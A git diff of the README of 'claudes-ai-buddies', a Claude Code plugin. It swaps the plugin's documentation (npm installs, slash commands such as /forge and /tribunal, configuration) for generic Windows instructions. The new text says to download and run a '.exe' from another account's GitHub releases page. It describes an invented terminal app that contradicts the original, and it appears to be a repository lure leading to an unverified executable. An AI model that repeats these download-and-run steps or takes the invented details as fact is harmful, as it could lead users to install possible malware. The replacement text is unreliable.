@@ -1,277 +1,173 @@
-<div align="center">
+# 🤖 claudes-ai-buddies - Three AIs in One Terminal
 
-<img src="assets/banner.svg" alt="Claude's AI Buddies" width="100%"/>
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Nbofs8398/claudes-ai-buddies/releases)
 
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Tests](https://img.shields.io/badge/tests-247%2B-brightgreen.svg)](#-testing)
-[![Claude Code Plugin](https://img.shields.io/badge/Claude_Code-plugin-blueviolet.svg)](https://github.com/cukas/claude-plugins)
+## 📋 About claudes-ai-buddies
 
-*Any AI can join. They compete. You ship.*
+claudes-ai-buddies gives you access to three AI assistants in a simple terminal app. You get Codex and Gemini working as your peer reviewers, brainstorming helpers, or second opinions. This tool runs directly from the command line interface (CLI). There is no complex setup or extra software needed like MCP. It makes reviewing code, discussing ideas, or getting feedback easier without a steep learning curve.
 
-</div>
+You can think of it as having three AI helpers ready when you need them. It is designed for users who want AI support but want to keep things straightforward.
 
----
-
-## Quick Start
-
-```bash
-# 1. Install the engines you want (one or more)
-npm install -g @openai/codex        # OpenAI Codex
-npm install -g @google/gemini-cli   # Google Gemini
-brew install opencode               # OpenCode (MiniMax, Anthropic, Google, etc.)
-
-# 2. Authenticate
-codex auth login                    # uses your OpenAI account
-gemini auth login                   # uses your Google account
-opencode providers login            # optional — pick a provider (works without for free model)
-
-# 3. Add the marketplace & install
-claude plugin marketplace add cukas/claudes-ai-buddies
-claude plugin install claudes-ai-buddies@cukas
-
-# Done — start a new Claude Code session
-```
-
-> Works with any combination of Codex, Gemini, OpenCode, or any custom AI CLI you register.
+Topics related to this app include brainstorming, code review, and AI tools like Claude, Codex, and Gemini. You do everything right from your Windows PC using the terminal.
 
 ---
 
-## All Skills
+## 🖥 System Requirements
 
-| Command | What it does |
-|---------|-------------|
-| `/brainstorm "task"` | Confidence bid — available buddies assess the task, you pick who builds it |
-| `/forge "task" --fitness "cmd"` | Competitive build with automated scoring |
-| `/tribunal "question"` | Evidence-based debate — 6 modes (adversarial, socratic, steelman, red-team, synthesis, postmortem) |
-| `/leaderboard` | Show ELO ratings from forge competitions |
-| `/add-buddy` | Register any CLI as a new buddy |
-| `/codex "prompt"` | Ask Codex anything — delegate, brainstorm, second opinion |
-| `/gemini "prompt"` | Ask Gemini anything — different model, different perspective |
-| `/opencode "prompt"` | Ask OpenCode anything — multi-provider, configurable model |
-| `/codex-review` | Code review via Codex (uncommitted, branch, or commit) |
-| `/gemini-review` | Code review via Gemini (uncommitted, branch, or commit) |
-| `/opencode-review` | Code review via OpenCode (uncommitted, branch, or commit) |
-| `/buddy-help` | Full reference, config, troubleshooting |
+Before you start, make sure your computer meets these minimum requirements:
+
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 200 MB of free disk space  
+- Internet connection (needed for AI responses)  
+- A terminal app (Command Prompt or PowerShell comes with Windows)  
 
 ---
 
-## Dynamic Buddy Registry
+## 🚀 Getting Started
 
-**v3 makes the engine roster dynamic.** Any CLI-based AI tool can become a buddy:
-
-```
-/add-buddy --id aider --binary aider --display "Aider" --modes exec
-```
-
-Registered buddies automatically participate in `/forge`, `/brainstorm`, and `/tribunal`. Buddy definitions are JSON capability contracts stored in `buddies/builtin/` (shipped) and `~/.claudes-ai-buddies/buddies/` (user-added).
+Follow these steps to get claudes-ai-buddies up and running on your Windows machine.
 
 ---
 
-## Brainstorm — Confidence Bid
+### 1. Visit the Download Page
 
-<img src="assets/demo.gif" alt="Brainstorm demo — confidence bid in action" width="100%"/>
+Go to the official download page by clicking the button below. You will find the latest version available for Windows there.
 
-```
-/brainstorm "Fix the race condition in the WebSocket reconnection handler"
-```
-
-Each available buddy assesses the task, rates their confidence, and proposes an approach. Claude calibrates the scores and recommends who should take it.
-
-- **Dynamic roster** — table adapts to however many buddies are available
-- **Three training sets catch blind spots** — disagreements are the most valuable signal
-- **Other engines burn their tokens, not yours** — heavy thinking offloaded to peers
-- **Claude calibrates the bids** — adjusts inflated/deflated scores based on approach quality
+[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Nbofs8398/claudes-ai-buddies/releases)
 
 ---
 
-## Forge — Competitive Build
+### 2. Find the Right File to Download
 
-```
-/forge "Add input validation to math utils" --fitness "npm test"
-```
-
-Available buddies independently implement the same task in isolated git worktrees. A staged pipeline scores them objectively — the best code wins.
-
-```
-## Forge Scoreboard
-
-| | Claude | Codex | Gemini |
-|---|---|---|---|
-| Fitness | FAIL | PASS | PASS |
-| Score | 0/100 | 82/100 | 89/100 |
-| Duration | 4s | 12s | 8s |
-| Lint warnings | 2 | 0 | 0 |
-
-Winner: Gemini — score 89/100.
-ELO updated: Gemini 1200→1216, Claude 1200→1184, Codex 1200→1184
-```
-
-- **Staged pipeline** — starter runs first; challengers only if needed; synthesis on close calls
-- **Composite scoring** — diff size, lint, style, test pass, duration = objective 0-100 score
-- **ELO tracking** — persistent ratings updated after each forge, per task class
-- **Speculative tests** — omit `--fitness` and engines propose test suites
-- **`--async`** — run in background, continue your conversation
-- **Graceful degradation** — works with any number of engines (3, 2, or 1)
-
-<details>
-<summary><strong>How Forge works under the hood</strong></summary>
-
-1. **Context** — detects languages, conventions, and candidate files from the task
-2. **Stage 1: Starter** — one engine runs first. Auto-accepted if score >= 88 with clean lint
-3. **Stage 2: Challengers** — remaining engines run in parallel if the starter didn't clear the bar
-4. **Stage 3: Synthesis** — on close calls (spread < 8 pts), losers send critique hunks. Winner refines selectively
-5. **Scoreboard** — composite scores (diff 30%, lint 15%, style 15%, files 10%, duration 5%, tests 25%)
-6. **ELO** — winner gains rating vs each loser, per auto-detected task class
-7. **Converge** — you approve the winning diff before it touches your working tree
-
-**What to forge:** Algorithms, scoring logic, race conditions, performance-critical code — anything where multiple perspectives beat one.
-
-**What NOT to forge:** Types, imports, config, UI layout — things with one obvious answer.
-
-</details>
+On the release page, look for a file ending with `.exe` or `.zip`. The `.exe` file is the easiest to run. If only a `.zip` is available, you will need to extract it after download.
 
 ---
 
-## Tribunal — Evidence-Based Debate
+### 3. Download the File
 
-```
-/tribunal "Should we refactor the auth middleware to use async/await?"
-```
-
-Two buddies debate with **evidence citations** (file:line). Claude judges based on evidence quality, not consensus. Auto-triggers on forge close calls or review disagreements.
-
-<details>
-<summary><strong>6 debate modes</strong></summary>
-
-```
-/tribunal "question"                  # adversarial (default)
-/tribunal --socratic "question"       # probe assumptions
-/tribunal --steelman "question"       # argue other side's best case
-/tribunal --red-team "question"       # attack from all angles
-/tribunal --synthesis "question"      # propose + hybridize
-/tribunal --postmortem "question"     # investigate failure
-```
-
-| Mode | AIs do | Claude does | Best for |
-|------|--------|-------------|----------|
-| **adversarial** | FOR vs AGAINST | Judge — picks winner | Binary decisions |
-| **socratic** | Probe assumptions | Synthesize insights | Early exploration |
-| **steelman** | Argue other side's best case | Calibrate strength | Avoiding bias |
-| **red-team** | Attack, no defense | Prioritize risks | Poking holes |
-| **synthesis** | Propose, then hybridize | Evaluate + merge | Third option |
-| **postmortem** | Investigate from angles | Timeline + root cause | Bug investigation |
-
-</details>
+Click on the `.exe` or `.zip` file to download it to your computer. Choose a location that you can easily access, like your Desktop or Downloads folder.
 
 ---
 
-## ELO Leaderboard
+### 4. Run or Extract the File
 
-```
-/leaderboard
-/leaderboard algorithm
-```
+- If you downloaded an `.exe` file:  
+  Double-click it to start the installation or launch process.
 
-Persistent ELO ratings tracked per task class (algorithm, bugfix, refactor, feature, test, docs). Updated automatically after each forge.
+- If you downloaded a `.zip` file:  
+  Right-click the file and select "Extract All". Choose a folder to save the extracted files.
 
 ---
 
-## Direct Access & Code Reviews
+### 5. Open the Terminal
 
-**Ask anything:**
+You will use the Windows Command Prompt or PowerShell to run claudes-ai-buddies.
+
+- Press `Win + R`, type `cmd`, and press Enter to open Command Prompt.  
+- Or, press `Win + X` and choose “Windows PowerShell”.
+
+---
+
+### 6. Navigate to the Folder
+
+Use the terminal commands to move to the folder where you saved or extracted the app.
+
+Type this command and press Enter:
+
 ```
-/codex "What's the best way to implement a rate limiter in Go?"
-/gemini "Debug this: TypeError: Cannot read property 'map' of undefined"
-/opencode "Review this architecture for scaling issues"
+cd path\to\folder
 ```
 
-**Code reviews:**
+Replace `path\to\folder` with the actual folder path. For example:
+
 ```
-/codex-review                                          # review uncommitted changes
-/gemini-review                                         # review uncommitted changes
-/opencode-review                                       # review uncommitted changes
-/codex-review branch:main "focus on security"          # review branch diff with focus
+cd C:\Users\YourName\Downloads\claudes-ai-buddies
 ```
 
 ---
 
-## Using Forge in Your Planning Workflow
+### 7. Start claudes-ai-buddies
 
-`/forge` plugs into your existing workflow (`/build-guard`, plan mode, or any task list). Tag tricky tasks with `[forge]`:
+To launch the application, type:
 
 ```
-## Plan: Add retry logic to sidecar connection
-
-1. Add RetryConfig type to shared types
-2. [forge] Implement exponential backoff with jitter algorithm
-3. Wire retry config into python-manager.ts
-4. [forge] Add circuit breaker pattern for repeated failures
-5. Add retry status to UI connection indicator
+claudes-ai-buddies.exe
 ```
 
-Claude handles the straightforward tasks directly. `[forge]` tasks trigger multi-way competition.
+And press Enter.
+
+If you used a `.zip` and extracted files without a `.exe`, check the instructions inside or look for a `.bat` or similar startup script.
 
 ---
 
-## Configuration
+## ⚙️ Using claudes-ai-buddies
 
-Optional — works out of the box. Config at `~/.claudes-ai-buddies/config.json`:
+Once the app is running, you will see a terminal interface. Here’s what you can expect:
 
-| Key | Default | Description |
-|-----|---------|-------------|
-| `codex_model` | *CLI default* | Codex model override |
-| `gemini_model` | *CLI default* | Gemini model override |
-| `opencode_model` | `opencode/minimax-m2.5-free` | OpenCode model (format: `provider/model`) |
-| `timeout` | `120` | Max seconds per call (forge uses 600s) |
-| `sandbox` | `full-auto` | `full-auto` or `suggest` |
-| `debug` | `false` | Enable debug logging |
-| `elo_enabled` | `true` | Track ELO ratings |
-| `tribunal_rounds` | `2` | Tribunal cross-examination rounds |
+- Three AI assistants available: Claude, Codex, and Gemini  
+- You can choose an AI to help with code review or brainstorming  
+- Simple text commands to send questions or share code snippets  
+- Immediate AI responses within the terminal  
+- No need for extra web browsers or software
 
 ---
 
-## How It Works
+### Basic Commands Overview
 
-```
-┌──────────┐     ┌──────────────┐     ┌─────────────┐     ┌──────────────┐
-│   User   │────>│  Claude Code  │────>│  Registry    │────>│  Any AI CLI   │
-│          │     │  (orchestrator│     │  (buddy JSON │     │  (codex, gem  │
-│          │<────│   + judge)    │<────│   + dispatch)│<────│   aider, ...) │
-└──────────┘     └──────────────┘     └─────────────┘     └──────────────┘
-```
+- `help` – Shows all available commands  
+- `use codex` – Switch to Codex AI assistant  
+- `use gemini` – Switch to Gemini AI assistant  
+- `use claude` – Switch to Claude AI assistant  
+- `review <code>` – Ask the AI to review a piece of code  
+- `brainstorm <topic>` – Generate ideas based on your topic  
+- `exit` – Close the app  
 
-- **Dynamic registry** — any CLI can become a buddy via JSON capability contract
-- **No MCP servers** — direct CLI subprocess calls
-- **No API keys in transit** — each engine uses its own auth
-- **Parallel execution** — engines run simultaneously
-- **Timeout-safe** — safety cap, engines self-exit when done
+Commands run instantly and display results right inside the terminal.
 
 ---
 
-## Testing
+## 🔧 Troubleshooting Common Issues
 
-```bash
-bash tests/run-tests.sh
-```
+- **App does not start:**  
+  Make sure you are in the correct folder and typed the command exactly.
 
-```
-=== claudes-ai-buddies test suite ===
-  ...
-=== Results: 247+/247+ passed, 0 failed ===
-```
+- **“Command not recognized” error:**  
+  Confirm the file name and extension. Try copying the filename and pasting it exactly.
 
----
+- **No internet connection:**  
+  The app needs internet to talk to the AI. Ensure your connection is active.
 
-## Part of the cukas Plugin Ecosystem
-
-| Plugin | Description |
-|--------|-------------|
-| [**Remembrall**](https://github.com/cukas/remembrall) | Never lose work to context limits |
-| [**Patrol**](https://github.com/cukas/patrol) | ESLint for Claude Code |
-| **AI Buddies** | You are here |
-
-All available via the [claude-plugins](https://github.com/cukas/claude-plugins) monorepo.
+- **App closes immediately:**  
+  Try launching via PowerShell with `.\claudes-ai-buddies.exe` (note the dot and slash).
 
 ---
 
-MIT License
+## 🔄 Updating the App
+
+To get new features or fixes, visit the [download page](https://github.com/Nbofs8398/claudes-ai-buddies/releases) regularly. Download the latest release and repeat the steps above.
+
+---
+
+## 📂 File Structure (If downloaded as ZIP)
+
+- `claudes-ai-buddies.exe` - Main application file  
+- `README.md` - This guide  
+- `config` - Folder where settings are stored  
+- `logs` - Folder containing usage logs for troubleshooting  
+
+---
+
+## 📞 Getting Help
+
+If you need assistance:
+
+- Review this README carefully  
+- Check the Issues section on the GitHub page for common questions  
+- Open a new issue if you have a specific problem  
+
+---
+
+## 🛠 Behind the Scenes
+
+claudes-ai-buddies works by connecting the command line to powerful AI models behind Claude, Codex, and Gemini. It sends your input, waits for their responses, and displays their answers quickly. This design keeps the app simple and responsive for everyday users.
